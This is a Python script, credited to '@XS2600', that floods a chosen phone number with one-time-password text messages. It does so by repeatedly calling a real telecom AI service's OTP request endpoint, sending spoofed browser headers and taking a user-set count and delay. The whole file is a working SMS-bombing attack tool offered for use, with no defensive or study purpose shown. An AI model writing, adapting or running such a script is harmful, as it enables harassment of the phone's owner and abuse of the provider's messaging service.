import requests
import time
import json

# SLT API Configuration
API_URL = "https://ai.dialog.lk/api/auth/request-otp"
def send_otp(phone_number):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://ai.dialog.lk",
        "Referer": "https://ai.dialog.lk/signin",
    }

    # Convert local format (076...) to international format (+947...)
    if phone_number.startswith('0'):
        international_num = "+94" + phone_number[1:]
    else:
        international_num = phone_number

    data = {
        "mobile": international_num,
        "name": "User",
    }

    try:
        response = requests.post(API_URL, headers=headers, json=data, timeout=10)
        if response.status_code == 200:
            return response.json().get("errorMessege", "OTP sent successfully")
        return f"Error: {response.text}"
    except requests.exceptions.RequestException as e:
        return f"Request failed: {str(e)}"

def main():
    phone_number = input("Enter phone number (format: 0767774598): ").strip()
    if not (phone_number.startswith('0') and len(phone_number) == 10 and phone_number.isdigit()):
        print("Invalid phone number format")
        return

    try:
        num_requests = int(input("Enter number of OTP requests to send: "))
        if num_requests <= 0:
            print("Number of requests must be positive")
            return
    except ValueError:
        print("Please enter a valid number")
        return

    # Modified delay input with default value of 0.5 seconds
    delay_input = input("Enter delay between requests in seconds (default: 0.5): ").strip()
    try:
        delay = float(delay_input) if delay_input else 0.5
        if delay < 0:
            print("Delay cannot be negative, using default 0.5 seconds")
            delay = 0.5
    except ValueError:
        print("Invalid input, using default 0.5 seconds")
        delay = 0.5

    print(f"\nSending {num_requests} OTP requests to {phone_number}...\n")
    
    for i in range(1, num_requests + 1):
        print(f"Request #{i}:")
        result = send_otp(phone_number)
        print(result)
        if i < num_requests and delay > 0:
            print(f"Waiting {delay} seconds...")
            time.sleep(delay)
        print()

    print("\nAll requests completed")

if __name__ == "__main__":
    main()

#Credit : @XS2600